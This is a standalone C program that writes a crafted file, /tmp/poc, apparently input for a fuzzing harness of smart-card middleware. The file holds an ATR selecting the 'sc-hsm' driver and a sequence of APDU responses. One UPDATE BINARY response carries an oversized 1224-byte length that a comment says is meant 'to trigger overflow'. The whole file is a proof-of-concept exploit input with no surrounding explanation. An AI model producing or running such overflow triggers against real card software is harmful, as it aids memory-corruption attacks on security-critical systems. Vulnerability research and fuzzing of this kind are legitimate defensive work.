#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // ATR chunk: 2-byte big-endian length + ATR bytes
    fputc(0x00, f); fputc(0x0C, f); // Length = 12 (big-endian)
    // 12-byte ATR that maps to SC-HSM driver
    fputc(0x3B, f);
    fputc(0x7F, f);
    fputc(0x96, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    // Driver name: null-terminated string
    fprintf(f, "sc-hsm");
    fputc(0x00, f);

    // APDU response chunks: each is 2-byte big-endian length + data
    // Response 1: SELECT FILE success
    fputc(0x00, f); fputc(0x02, f); // Length = 2 (big-endian)
    fputc(0x90, f); fputc(0x00, f);

    // Response 2: READ BINARY success
    fputc(0x00, f); fputc(0x02, f); // Length = 2 (big-endian)
    fputc(0x90, f); fputc(0x00, f);

    // Response 3: UPDATE BINARY with crafted large length to trigger overflow
    // Length = 1224 (0x04C8) in big-endian = 0x04 0xC8
    fputc(0x04, f); fputc(0xC8, f);
    // Write 1224 bytes of dummy data
    for (int i = 0; i < 1224; i++) {
        fputc(0x41, f);
    }

    // Additional safe response chunks
    for (int i = 0; i < 10; i++) {
        fputc(0x00, f); fputc(0x02, f);
        fputc(0x90, f); fputc(0x00, f);
    }

    fclose(f);
    return 0;
}